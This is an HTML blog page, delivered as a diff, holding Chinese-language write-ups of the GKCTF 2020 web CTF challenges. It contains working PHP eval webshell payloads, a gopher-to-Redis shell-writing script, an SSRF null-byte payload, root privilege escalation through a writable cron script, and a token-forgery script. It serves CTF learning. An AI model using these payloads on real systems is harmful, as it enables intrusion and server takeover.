@@ -1,0 +1,466 @@
+<!DOCTYPE html><html lang="zh-Hans" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>2020-GKCTF-WEB | Tyaoo's Blog</title><meta name="keywords" content="CTF"><meta name="author" content="Tyaoo"><meta name="copyright" content="Tyaoo"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="找了个时间复现了 GKCTF 的 WEB 题目">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2020-GKCTF-WEB">
+<meta property="og:url" content="https://tyaoo.github.io/2020/05/28/2020-GKCTF-Web/index.html">
+<meta property="og:site_name" content="Tyaoo&#39;s Blog">
+<meta property="og:description" content="找了个时间复现了 GKCTF 的 WEB 题目">
+<meta property="og:locale">
+<meta property="og:image" content="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7">
+<meta property="article:published_time" content="2020-05-28T08:35:58.000Z">
+<meta property="article:modified_time" content="2020-05-28T09:09:22.820Z">
+<meta property="article:author" content="Tyaoo">
+<meta property="article:tag" content="CTF">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://tyaoo.github.io/2020/05/28/2020-GKCTF-Web/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"search.xml","languages":{"hits_empty":"We didn't find any results for the search: ${query}"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: undefined,
+  copy: {
+    success: 'Copy successfully',
+    error: 'Copy error',
+    noSupport: 'The browser does not support'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: 'Just',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '2020-GKCTF-WEB',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2020-05-28 17:09:22'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><link rel="stylesheet" href="/css/custom.css"><meta name="generator" content="Hexo 6.0.0"><link rel="alternate" href="/atom.xml" title="Tyaoo's Blog" type="application/atom+xml">
+</head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/avatar.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data is-center"><div class="data-item"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">35</div></a></div><div class="data-item"><a href="/tags/"><div class="headline">Tags</div><div class="length-num">11</div></a></div><div class="data-item"><a href="/categories/"><div class="headline">Categories</div><div class="length-num">0</div></a></div></div><hr/></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Tyaoo's Blog</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> Search</span></a></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">2020-GKCTF-WEB</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2020-05-28T08:35:58.000Z" title="Created 2020-05-28 16:35:58">2020-05-28</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2020-05-28T09:09:22.820Z" title="Updated 2020-05-28 17:09:22">2020-05-28</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="2020-GKCTF-WEB"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post View:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p>找了个时间复现了 GKCTF 的 WEB 题目</p>
+<span id="more"></span>
+
+<h2 id="GKCTF2020-CheckIN"><a href="#GKCTF2020-CheckIN" class="headerlink" title="[GKCTF2020]CheckIN"></a>[GKCTF2020]CheckIN</h2><p><strong>代码执行</strong></p>
+<p>进去给到源码，给了我们一个小马</p>
+<pre><code class="php">&lt;?php 
+highlight_file(__FILE__);
+class ClassName
+&#123;
+        public $code = null;
+        public $decode = null;
+        function __construct()
+        &#123;
+                $this-&gt;code = @$this-&gt;x()[&#39;Ginkgo&#39;];
+                $this-&gt;decode = @base64_decode( $this-&gt;code );
+                @Eval($this-&gt;decode);
+        &#125;
+
+        public function x()
+        &#123;
+                return $_REQUEST;
+        &#125;
+&#125;
+new ClassName();</code></pre>
+<p>先上一个小马</p>
+<pre><code class="php">php &gt; echo base64_encode(&#39;eval($_REQUEST[kk]);&#39;);
+ZXZhbCgkX1JFUVVFU1Rba2tdKTs=</code></pre>
+<p>看看 phpinfo</p>
+<pre><code>?Ginkgo=ZXZhbCgkX1JFUVVFU1Rba2tdKTs%3D&amp;kk=phpinfo();</code></pre><p>绕 disable_functions</p>
+<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200528113759.png" alt="image-20200528103728833"></p>
+<p>蚁剑连上去，flag 需要 /readflag</p>
+<p>可以直接用这个绕  <a target="_blank" rel="noopener" href="https://github.com/mm0r1/exploits/blob/master/php7-gc-bypass/exploit.php">https://github.com/mm0r1/exploits/blob/master/php7-gc-bypass/exploit.php</a></p>
+<p>上传到 /tmp 目录，直接包含就好</p>
+<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200528113803.png" alt=""></p>
+<p>执行命令</p>
+<pre><code>?Ginkgo=ZXZhbCgkX1JFUVVFU1Rba2tdKTs%3D&amp;kk=include(&quot;/tmp/exploit.php&quot;);&amp;cmd=/readflag</code></pre><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200528113808.png" alt="image-20200528105315601"></p>
+<h2 id="GKCTF2020-cve版签到"><a href="#GKCTF2020-cve版签到" class="headerlink" title="[GKCTF2020]cve版签到"></a>[GKCTF2020]cve版签到</h2><p><strong>cve-2020-7066</strong></p>
+<p>exp 在这里 <a target="_blank" rel="noopener" href="https://bugs.php.net/bug.php?id=79329">https://bugs.php.net/bug.php?id=79329</a></p>
+<p>直接打就好，访问 127.0.0.1 返回 hint</p>
+<pre><code>?url=http://127.0.0.1%00.ctfhub.com</code></pre><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200528164116.png" alt="image-20200528110116218"></p>
+<pre><code>?url=http://127.0.0.123%00.ctfhub.com</code></pre><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200528164121.png" alt="image-20200528110131001"></p>
+<h2 id="GKCTF2020-老八小超市儿"><a href="#GKCTF2020-老八小超市儿" class="headerlink" title="[GKCTF2020]老八小超市儿"></a>[GKCTF2020]老八小超市儿</h2><p><strong>弱口令+后台geishell+提权</strong></p>
+<p>参考 <a target="_blank" rel="noopener" href="http://www.nctry.com/1660.html">http://www.nctry.com/1660.html</a> 后台getshell</p>
+<p>我这里扔了一个冰蝎的马，连上读 /flag</p>
+<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200528164128.png" alt="image-20200528110926892"></p>
+<p>读了个寂寞，提示日期很重要</p>
+<p>上传个 <a target="_blank" rel="noopener" href="https://github.com/rebootuser/LinEnum">LinEnum</a> 读一下信息</p>
+<p>在进程信息那里我们看到了 root 在执行一个 /auto.sh</p>
+<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200528164131.png" alt="image-20200528112105303"></p>
+<p>看一下文件，这也是解释了进程为什么一直有 sleep 60 这个操作</p>
+<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200528164137.png" alt="image-20200528112206309"></p>
+<p>看一下 py 文件</p>
+<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200528164139.png" alt="image-20200528112300934"></p>
+<p>这很显然就是我们的变量劫持，看一下权限</p>
+<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200528113824.png" alt="image-20200528112351256"></p>
+<p>所以我们可以通过改写这个 py 文件提权</p>
+<p>其实，这个 /auto.sh 也是可写的，我们也可以改这个</p>
+<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200528113826.png" alt="image-20200528112456969"></p>
+<p>我这里就直接改 py 了</p>
+<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200528113829.png" alt="image-20200528113533012"></p>
+<p>等个一分钟收割 flag</p>
+<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200528113831.png" alt="image-20200528113511733"></p>
+<h2 id="GKCTF2020-EZ三剑客-EzWeb"><a href="#GKCTF2020-EZ三剑客-EzWeb" class="headerlink" title="[GKCTF2020]EZ三剑客-EzWeb"></a>[GKCTF2020]EZ三剑客-EzWeb</h2><p><strong>内网+redis写shell</strong></p>
+<p>进去源码有提示</p>
+<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200528113834.png" alt="image-20200528113752714"></p>
+<p>给到了一个 hosts 的信息</p>
+<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200528113906.png" alt="image-20200528113904509"></p>
+<p>尝试访问 localhost 被 waf</p>
+<pre><code>/index.php?url=http://127.0.0.1&amp;submit=提交</code></pre><p>那就改成内网地址试试</p>
+<pre><code>/index.php?url=http://173.235.100.10&amp;submit=提交</code></pre><p>返回了正常页面</p>
+<p>这里我们揣测出题人的思路，那应该就是让我扫内网地址，直接 bp，发现了这个比较特殊</p>
+<pre><code>/index.php?url=http://173.235.100.11&amp;submit=提交</code></pre><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200528114349.png" alt="image-20200528114209680"></p>
+<p>那就是让我们去扫描端口，继续 bp 扫常用端口，发现 redis 有回显</p>
+<blockquote>
+<p>记住要扫常用服务，不要从1开始扫，不然要很久</p>
+</blockquote>
+<pre><code>/index.php?url=http://173.235.100.11:6379&amp;submit=提交</code></pre><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200528114356.png" alt="image-20200528114347813"></p>
+<p>gopher 协议没有 ban，发现可以 redis 随意写 shell</p>
+<blockquote>
+<p>注意编码问题就好</p>
+</blockquote>
+<p>这里直接贴上 payload</p>
+<pre><code class="python">import urllib
+import requests as rq
+
+protocol=&quot;gopher://&quot;
+ip=&quot;173.19.221.11&quot;
+port=&quot;6379&quot;
+shell=&quot;\n\n\n\n&lt;?php system(&#39;ls / -al&#39;);system(&#39;cat /flag&#39;); ?&gt;\n\n\n\n&quot;
+filename=&quot;index.php&quot;
+path=&quot;/var/www/html&quot;
+passwd=&quot;&quot;
+cmd=[&quot;flushall&quot;,
+     &quot;set 1 &#123;&#125;&quot;.format(shell.replace(&quot; &quot;,&quot;$&#123;IFS&#125;&quot;)),
+     &quot;config set dir &#123;&#125;&quot;.format(path),
+     &quot;config set dbfilename &#123;&#125;&quot;.format(filename),
+     &quot;save&quot;,
+     &quot;quit&quot;
+     ]
+if passwd:
+    cmd.insert(0,&quot;AUTH &#123;&#125;&quot;.format(passwd))
+payload=protocol+ip+&quot;:&quot;+port+&quot;/_&quot;
+def redis_format(arr):
+    CRLF=&quot;\r\n&quot;
+    redis_arr = arr.split(&quot; &quot;)
+    cmd=&quot;&quot;
+    cmd+=&quot;*&quot;+str(len(redis_arr))
+    for x in redis_arr:
+        cmd+=CRLF+&quot;$&quot;+str(len((x.replace(&quot;$&#123;IFS&#125;&quot;,&quot; &quot;))))+CRLF+x.replace(&quot;$&#123;IFS&#125;&quot;,&quot; &quot;)
+    cmd+=CRLF
+    return cmd
+
+if __name__==&quot;__main__&quot;:
+    for x in cmd:
+        payload += redis_format(x).replace(&quot;\r\n&quot;,&quot;%250D%250A&quot;).replace(&quot;\n&quot;,&quot;%250A&quot;).replace(&quot;?&quot;,&quot;%253f&quot;)
+    print(payload)</code></pre>
+<blockquote>
+<p>这里我省了步骤，我是先看了 phpinfo()，发现没有 ban system()，再列一个目录，再看 flag 在哪</p>
+</blockquote>
+<p>上传之后回显成功</p>
+<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200528114937.png" alt="image-20200528114934084"></p>
+<p>访问内网机子就能看到</p>
+<pre><code>/index.php?url=http://173.235.100.11&amp;submit=提交</code></pre><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200528115043.png" alt="image-20200528115041491"></p>
+<h2 id="GKCTF2020-EZ三剑客-EzNode"><a href="#GKCTF2020-EZ三剑客-EzNode" class="headerlink" title="[GKCTF2020]EZ三剑客-EzNode"></a>[GKCTF2020]EZ三剑客-EzNode</h2><p><strong>nodejs</strong></p>
+<p>上来给了代码和版本，直接代码审计</p>
+<p>总体逻辑就是绕过这里的 waf</p>
+<pre><code class="js">app.use((req, res, next) =&gt; &#123;
+  if (req.path === &#39;/eval&#39;) &#123;
+    let delay = 60 * 1000;
+    console.log(delay);
+    if (Number.isInteger(parseInt(req.query.delay))) &#123;
+      delay = Math.max(delay, parseInt(req.query.delay));
+    &#125;
+    const t = setTimeout(() =&gt; next(), delay);
+    // 2020.1/WORKER3 老板说让我优化一下速度，我就直接这样写了，其他人写了啥关我p事
+    setTimeout(() =&gt; &#123;
+      clearTimeout(t);
+      console.log(&#39;timeout&#39;);
+      try &#123;
+        res.send(&#39;Timeout!&#39;);
+      &#125; catch (e) &#123;
+
+      &#125;
+    &#125;, 1000);
+  &#125; else &#123;
+    next();
+  &#125;
+&#125;);</code></pre>
+<p>就可以直接 eval 了</p>
+<pre><code class="js">app.post(&#39;/eval&#39;, function (req, res) &#123;
+  let response = &#39;&#39;;
+  if (req.body.e) &#123;
+    try &#123;
+      response = saferEval(req.body.e);
+    &#125; catch (e) &#123;
+      response = &#39;Wrong Wrong Wrong!!!!&#39;;
+    &#125;
+  &#125;
+  res.send(String(response));
+&#125;);</code></pre>
+<p>waf 可以用 int 溢出漏洞绕过，所以传入 2147483648 绕过成功</p>
+<blockquote>
+<p>当 delay 大于 2147483647 或小于 1 时,延迟将设置为 1</p>
+</blockquote>
+<p>后面就是绕 saferEval 了，这个根据版本去搜一下就好 ，最新版本的一般在 github 的 issues 里找到，可以直接拿来用</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/commenthol/safer-eval/issues/11">https://github.com/commenthol/safer-eval/issues/11</a></p>
+<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200528120421.png" alt="image-20200528120418230"></p>
+<h2 id="GKCTF2020-EZ三剑客-EzTypecho"><a href="#GKCTF2020-EZ三剑客-EzTypecho" class="headerlink" title="[GKCTF2020]EZ三剑客-EzTypecho"></a>[GKCTF2020]EZ三剑客-EzTypecho</h2><p><strong>反序列化</strong></p>
+<p><a target="_blank" rel="noopener" href="https://www.kingkk.com/2018/07/Typecho%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">Typecho反序列化漏洞复现</a></p>
+<p>原版本在 install.php 那会有一个反序列化</p>
+<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200528121417.png" alt="image-20200528121416697"></p>
+<p>但是出题人在这里加多了一个 <code>if(!isset($_SESSION))</code></p>
+<p>但是后面还有一处，我们直接传入 <code>?start</code> 触发即可</p>
+<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200528121358.png" alt="image-20200528121355676"></p>
+<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200528121956.png" alt="image-20200528121820549"></p>
+<p>命令执行无限制，直接读 /flag 就好</p>
+<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200528122002.png" alt="image-20200528121954615"></p>
+<h2 id="GKCTF2020-Node-Exe"><a href="#GKCTF2020-Node-Exe" class="headerlink" title="[GKCTF2020]Node-Exe"></a>[GKCTF2020]Node-Exe</h2><p>第一次碰到这题目，无从下手，不过还挺有意思的</p>
+<p>先看一下程序运行逻辑，打开 admin 登陆进去，然后给你三个 flag，打开 fiddler 抓包发现是发送了一个含有 timestamp 的 json，id 对应的就是 flag 的位置</p>
+<blockquote>
+<p>命令行断点 bpu <a target="_blank" rel="noopener" href="http://xxx.node3.buuoj.cn">http://xxx.node3.buuoj.cn</a></p>
+</blockquote>
+<pre><code>&#123;&quot;id&quot;:1,&quot;timestamp&quot;:1590639747000&#125;</code></pre><p>直接修改 id = 3 会返回</p>
+<pre><code>&#123;&quot;message&quot;:&quot;HaHa Hacker!!!&quot;&#125;</code></pre><p>写脚本伪造 timestamp 也失败</p>
+<p>所以后台应该是验证了 token</p>
+<p>还是去看看源码吧，把安装程序改成 zip 解压一下，源码在 </p>
+<pre><code>/app-64/resources/app.asar</code></pre><p>进行反编译</p>
+<pre><code>npm install -g asar
+asar extract app.asar app</code></pre><p>看一下 buyflag 的逻辑</p>
+<pre><code class="js">buyFlag: function(e) &#123;
+    var i = this;
+    return c()(a.a.mark((function t() &#123;
+        var o;
+        return a.a.wrap((function(t) &#123;
+            for (;;) switch (t.prev = t.next) &#123;
+            case 0:
+                return o = &#123;
+                    id: e,
+                    timestamp: Date.parse(new Date)
+                &#125;,
+                t.t0 = i.$http,
+                t.t1 = i.url + &quot;/buyflag&quot;,
+                t.t2 = o,
+                t.next = 6,
+                i.makeToken(o);
+            case 6:
+                t.t3 = t.sent,
+                t.t4 = &#123;
+                    token: t.t3
+                &#125;,
+                t.t5 = &#123;
+                    headers: t.t4
+                &#125;,
+                t.t6 = function(e) &#123;
+                    i.$Modal.info(&#123;
+                        title: &quot;购买结果&quot;,
+                        content: e.data[0].flag
+                    &#125;)
+                &#125;,
+                t.t0.post.call(t.t0, t.t1, t.t2, t.t5).then(t.t6);
+            case 11:
+            case &quot;end&quot;:
+                return t.stop()
+            &#125;
+        &#125;), t, i)
+    &#125;)))()
+&#125;</code></pre>
+<p>看一下 makeToken</p>
+<pre><code class="js">makeToken: function(e) &#123;
+    var i = this;
+    return c()(a.a.mark((function t() &#123;
+        var o, r;
+        return a.a.wrap((function(t) &#123;
+            for (;;) switch (t.prev = t.next) &#123;
+            case 0:
+                return &quot;31169fedc9a20ecf&quot;,
+                &quot;d96adeefaa0102a9&quot;,
+                o = f()(n()(e)),
+                t.next = 5,
+                i.encrypt(&quot;31169fedc9a20ecf&quot;, &quot;d96adeefaa0102a9&quot;, o);
+            case 5:
+                return r = t.sent,
+                t.abrupt(&quot;return&quot;, r);
+            case 7:
+            case &quot;end&quot;:
+                return t.stop()
+            &#125;
+        &#125;), t, i)
+    &#125;)))()
+&#125;</code></pre>
+<p>再看一下 encrypt</p>
+<pre><code class="js">encrypt: function(e, i, t) &#123;
+    var o = this;
+    return c()(a.a.mark((function n() &#123;
+        return a.a.wrap((function(o) &#123;
+            for (;;) switch (o.prev = o.next) &#123;
+            case 0:
+                return o.abrupt(&quot;return&quot;, new s.a((function(o) &#123;
+                    var n = p.a.createCipheriv(&quot;aes-128-cbc&quot;, e, i),
+                    r = n.update(t, &quot;utf8&quot;, &quot;binary&quot;);
+                    r += n.final(&quot;binary&quot;),
+                    o(r = new Buffer.from(r, &quot;binary&quot;).toString(&quot;hex&quot;))
+                &#125;)));
+            case 1:
+            case &quot;end&quot;:
+                return o.stop()
+            &#125;
+        &#125;), n, o)
+    &#125;)))()
+&#125;,</code></pre>
+<p>所以 token 使用了 <code>aes-128-cbc</code> 进行对经过了 <code>o=f()(n()(e))</code> 处理的 json 进行加密，key 是 <code>31169fedc9a20ecf</code>，iv 是 <code>d96adeefaa0102a9</code></p>
+<p>随便拿一个 token 试验一下</p>
+<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200528164157.png" alt="image-20200528150727592"></p>
+<p>32 位的我们拿 md5 测试一下</p>
+<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200528164154.png" alt="image-20200528150920692"></p>
+<p>可以看到是吻合的，这里贴上脚本</p>
+<pre><code class="python"># coding:utf-8
+from Crypto.Cipher import AES
+from binascii import b2a_hex, a2b_hex
+import time, json, datetime, hashlib
+import requests as rq
+
+def encrypt(raw):
+    BS = 16
+    pad = lambda s: s + (BS - len(s) % BS) * chr(BS - len(s) % BS) 
+    key = b&#39;31169fedc9a20ecf&#39;
+    iv = b&#39;d96adeefaa0102a9&#39;
+    raw = pad(raw).encode()
+    cryptor = AES.new(key, AES.MODE_CBC, iv)
+    ciphertext = cryptor.encrypt(raw)
+    return b2a_hex(ciphertext).decode()
+
+def get_data_token():
+    dtime = datetime.datetime.now()
+    t = int(time.mktime(dtime.timetuple())) * 1000
+    data = json.dumps(&#123;&quot;id&quot;:&quot;3||1&quot;, &quot;timestamp&quot;:t&#125;).replace(&#39; &#39;,&#39;&#39;)
+    print(&quot;[+] data：%s&quot; % data)
+    token = encrypt(hashlib.md5(data.encode()).hexdigest())
+    print(&quot;[+] token：%s&quot; % token)
+    headers = &#123;
+        &quot;Content-Type&quot;: &quot;application/json;charset=UTF-8&quot;,
+        &quot;token&quot;:token
+    &#125;
+    return data, headers
+
+if __name__== &quot;__main__&quot;:
+    url = &quot;http://1165bc7f-ecfb-45e8-bbc5-533876f73e8d.node3.buuoj.cn/buyflag&quot;
+    data, headers = get_data_token()
+    res = rq.post(url, data=data, headers=headers)
+    print(res.text)
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200528164148.png" alt="image-20200528162837226"></p>
+<blockquote>
+<p>需要注意的是</p>
+<ol>
+<li>使用 json.dumps 要把结果的空格都去掉</li>
+<li>AES 加密使用的 padding 是 pkcs5</li>
+<li>时间戳的获取一定要用 datetime()，不能用直接 time.time() </li>
+</ol>
+</blockquote>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">Tyaoo</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="https://tyaoo.github.io/2020/05/28/2020-GKCTF-Web/">https://tyaoo.github.io/2020/05/28/2020-GKCTF-Web/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/CTF/">CTF</a></div><div class="post_share"><div class="social-share" data-image="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2020/07/28/ThinkPHP6-0%E5%8F%8D%E5%BA%8F%E5%88%97%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"><img class="prev-cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">Previous Post</div><div class="prev_info">ThinkPHP6.0反序列漏洞分析</div></div></a></div><div class="next-post pull-right"><a href="/2020/05/27/Linux%E6%8F%90%E6%9D%83%E5%B0%8F%E7%9F%A5%E8%AF%86/"><img class="next-cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">Linux提权小知识</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Tyaoo</div><div class="author-info__description"></div></div><div class="card-info-data is-center"><div class="card-info-data-item"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">35</div></a></div><div class="card-info-data-item"><a href="/tags/"><div class="headline">Tags</div><div class="length-num">11</div></a></div><div class="card-info-data-item"><a href="/categories/"><div class="headline">Categories</div><div class="length-num">0</div></a></div></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/Tyaoo"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Catalog</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#GKCTF2020-CheckIN"><span class="toc-number">1.</span> <span class="toc-text">[GKCTF2020]CheckIN</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#GKCTF2020-cve%E7%89%88%E7%AD%BE%E5%88%B0"><span class="toc-number">2.</span> <span class="toc-text">[GKCTF2020]cve版签到</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#GKCTF2020-%E8%80%81%E5%85%AB%E5%B0%8F%E8%B6%85%E5%B8%82%E5%84%BF"><span class="toc-number">3.</span> <span 